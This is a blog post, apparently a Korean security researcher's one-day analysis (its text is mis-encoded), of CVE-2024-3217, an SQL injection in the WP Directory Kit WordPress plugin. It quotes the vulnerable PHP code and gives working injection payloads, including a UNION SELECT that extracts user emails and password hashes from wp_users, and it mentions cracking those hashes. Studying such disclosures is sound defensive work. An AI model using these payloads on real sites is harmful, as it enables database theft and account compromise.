---
title: "[CVE-2024-3217] ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ"
description: "WP Directory Kit í”ŒëŸ¬ê·¸ì¸ 1.3.0 ì´ì „ ë²„ì „ì—ì„œ ì‚¬ìš©ì ì…ë ¥ê°’ì˜ ë¶ˆì¶©ë¶„í•œ ì´ìŠ¤ì¼€ì´í”„ ì²˜ë¦¬ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” SQL Injection ì·¨ì•½ì "
author: khh
date: 2025-02-16 10:42:00 +0900
categories: [One-Day ë¶„ì„, WordPress]
tags: [ë¹¡ê³µíŒŸ, ì½˜í…ŒìŠ¤íŠ¸ ë„¤ë·¸ë¼, WordPress, WordPress Plugin, CVE, CVE-2024-3217]
image: assets/img/wordpress-thumbnail.png
exclude_img: true
---

## ê°œìš”

WP Directory Kit í”ŒëŸ¬ê·¸ì¸ì€ ì‚¬ìš©ìê°€ ì œê³µí•œ ë§¤ê°œë³€ìˆ˜ attribute_id ë° attribute_value ì—ì„œ ë¶ˆì¶©ë¶„í•œ ì´ìŠ¤ì¼€ì´í•‘  ì²˜ë¦¬ë¡œ 1.3.0 ì´ì „ ë²„ì „ê¹Œì§€ SQL Injection ê³µê²©ì— ì·¨ì•½í•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ êµ¬ë…ì ì´ìƒ ê¶Œí•œì´ ìˆëŠ” ê³µê²©ìê°€ ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ë¯¼ê°í•œ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ë¶„ì„

\wpdirectorykit\application\controllers\Wdk_frontendajax.php

```php
		if($table == 'calendar_listing_m')
			$table = 'listing_m';

		$table_name = substr($table,0, -2);
		$attr_id = sanitize_text_field($parameters['attribute_id']);
		$attr_val = sanitize_text_field($parameters['attribute_value']);
		$attr_search = sanitize_text_field($parameters['search_term']);
		$skip_id = intval($parameters['skip_id']);
		$language_id = intval($parameters['language_id']);

		if(empty($language_id))
			$language_id = NULL;

		$id_part="";
		if(is_numeric($attr_search))
			$id_part = "$attr_id=$attr_search OR ";
```

$attribute_id ë˜ëŠ” $attribute_value ë§¤ê°œë³€ìˆ˜ì—ì„œ sanitize_text_field í•¨ìˆ˜ê°€ ì‚¬ìš©ëœ ê²ƒì„ ë³¼ ìˆ˜ ìˆì§€ë§Œ, ì·¨ì•½ì ì´ ì—¬ê¸°ì„œ ë°œìƒí•˜ëŠ” ê²ƒì€ ì•„ë‹™ë‹ˆë‹¤.

ê·¸ ì•„ë˜ ë¶€ë¶„ ì¡°ê±´ë¬¸ is_numeric($attr_search)ì—ì„œ $attr_searchê°€ ìˆ«ìì¸ ê²½ìš°, â€œ$attr_id=$attr_search OR â€œì— SQL queryë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  ê·¸ë¦¬ê³  ì‘ì€ ë”°ì˜´í‘œëŠ” ì¿¼ë¦¬ì˜ ì¼ë¶€ì´ê¸° ë•Œë¬¸ì— ì´ìŠ¤ì¼€ì´í”„ í•  í•„ìš” ì—†ì´ ì§ì ‘ ì¸ì ì…˜ ì½”ë“œë¥¼ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```php
		$id_part="";
		if(is_numeric($attr_search))
			$id_part = "$attr_id=$attr_search OR ";
	
		$this->load->model($table);
		
		$where = array();
		if(!empty($attr_search))
			$where["($id_part $attr_val LIKE '%$attr_search%')"] = NULL;
```

ì¿¼ë¦¬ê°€ ë§Œë“¤ì–´ì§€ê³  $id_partì— ì €ì¥ë˜ë©´ ì´ ì¿¼ë¦¬ëŠ” ì•„ë˜ ì½”ë“œì—ì„œ ì‚¬ìš©ë©ë‹ˆë‹¤.

> $where["($id_part $attr_val LIKE '%$attr_search%')"] = NULL;
> 

ì´ì œ í•´ë‹¹ ë¶€ë¶„ì— ë„ë‹¬í•  ìˆ˜ ìˆëŠ” ìš”ì²­ì„ ìƒì„±í•´ $attr_searchì— ìˆ«ìë¥¼ ë„£ì€ í›„ ì¸ì ì…˜ì„ ìˆ˜í–‰í•´ ì‘ë‹µê°’ì„ í™•ì¸í•´ ë³´ê² ìŠµë‹ˆë‹¤.

## POC

ë¨¼ì € WP Directory Kit 1.3.0 ë²„ì „ì„ ë‹¤ìš´ë°›ì€ í›„ í”ŒëŸ¬ê·¸ì¸ì„ í™œì„±í™” í•´ì¤ë‹ˆë‹¤.

![image.png](/assets/posts/one-day/2025-02-16/image-001.png)

Listings ë©”ë‰´ì—ì„œ Add Listingì„ í´ë¦­í•´ ëª©ë¡ì„ ì¶”ê°€í•´ì¤ë‹ˆë‹¤.

![image.png](/assets/posts/one-day/2025-02-16/image-002.png)

ê° í•„ë“œë¥¼ ì„ì˜ì˜ ê°’ìœ¼ë¡œ ì„¤ì • í›„ ì €ì¥í•©ë‹ˆë‹¤.(ì €ì¥í•  ë•Œ ë„¤íŠ¸ì›Œí¬ íŒ¨í‚·ì„ ìº¡ì²˜í•©ë‹ˆë‹¤)

![image.png](/assets/posts/one-day/2025-02-16/image-003.png)

![image.png](/assets/posts/one-day/2025-02-16/image-004.png)

ìš”ì²­ ë§¤ê°œë³€ìˆ˜ì—ì„œ attribute_idì— ì•„ë˜ì™€ ê°™ì€ ì¿¼ë¦¬ë¥¼ ì‚½ì…í•˜ê³ , $search_termì€ 1ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.

<aside>
ğŸ’¡

$attribute_id = `ID=1)or 1=1-- -`

$search_term = 1

</aside>

ìœ„ì™€ ê°™ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ ì„¤ì • í›„ ìš”ì²­ì„ ë³´ë‚´ë©´ ì•„ë˜ì™€ ê°™ì´ valueì— IDê°’ì´ 1ì¸ ì‚¬ìš©ìì™€ ì‚¬ìš©ì ë©”ì¼ì´ ë°˜í™˜ë©ë‹ˆë‹¤.

![image.png](/assets/posts/one-day/2025-02-16/image-005.png)

ì´ì œ í•„ìš”í•œ ìµœì†Œ ê¶Œí•œì„ í™•ì¸í•˜ê¸° ìœ„í•´ ì¿ í‚¤ê°€ ì—†ëŠ” ìƒíƒœ ì¦‰, ê¶Œí•œì´ 0ì¸ ìƒíƒœì—ì„œ í™•ì¸í•´ ë³´ê² ìŠµë‹ˆë‹¤.

ì¿ í‚¤ë¥¼ ì‚­ì œí•œ ìƒíƒœì—ì„œ ì•„ê¹Œ ê³µê²©ì— ì‚¬ìš©í–ˆë˜ ë§¤ê°œë³€ìˆ˜ë¡œ ì„¤ì • í›„ ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤.

![image.png](/assets/posts/one-day/2025-02-16/image-006.png)

ê·¸ëŸ¼ ì•„ë˜ì™€ ê°™ì´ ì—¬ì „íˆ ë°ì´í„° ë² ì´ìŠ¤ì—ì„œ ê°’ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ë¡œì¨ ìµœì†Œ ê¶Œí•œì¸ êµ¬ë…ì ê¶Œí•œë¶€í„° ì·¨ì•½ì ì´ í„°ì§„ë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image.png](/assets/posts/one-day/2025-02-16/image-007.png)

ì´ì œ wp_users í…Œì´ë¸”ì—ì„œ ëª¨ë“  ê°’ì„ ì¶”ì¶œí•˜ëŠ” í˜ì´ë¡œë“œë¥¼ ìƒì„±í•´ ë³´ê² ìŠµë‹ˆë‹¤.

> ID=1) UNION ALL SELECT NULL,NULL,NULL,CONCAT(display_name,0x3a,display_name,0x3a,user_email,0x3a,user_pass),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -
> 

<aside>
ğŸ’¡

$search_termì„ ìˆ«ìë¡œ ì„¤ì •í•´ì•¼ í•©ë‹ˆë‹¤.

</aside>

ì•„ë˜ì™€ ê°™ì´ ì¿ í‚¤ë¥¼ ì‚­ì œí•œ ìµœì†Œê¶Œí•œì—ì„œ $attribute_idë¥¼ ìœ„ í˜ì´ë¡œë“œë¡œ ì„¤ì •í•˜ê³ , $search_termì„ ìˆ«ìë¡œ ì„¤ì •í•œ í›„ ìš”ì²­ì„ ë³´ëƒ…ë‹ˆë‹¤.

![image.png](/assets/posts/one-day/2025-02-16/image-008.png)

ê·¸ëŸ¼  wp_users ë°ì´í„°ë² ì´ìŠ¤ì˜ ëª¨ë“  ê°’ì´ ì¶”ì¶œë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image.png](/assets/posts/one-day/2025-02-16/image-009.png)

ë§Œì•½ ì‚¬ìš©ìê°€ passwordë¥¼ ê°„ë‹¨í•˜ê²Œ ì„¤ì •í–ˆë‹¤ë©´ hashcrack íˆ´ì„ ì‚¬ìš©í•˜ì—¬ íŒ¨ìŠ¤ì›Œë“œë¥¼ ì•Œì•„ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image.png](/assets/posts/one-day/2025-02-16/image-010.png)

![image.png](/assets/posts/one-day/2025-02-16/image-011.png)

## íŒ¨ì¹˜

![image.png](/assets/posts/one-day/2025-02-16/image-012.png)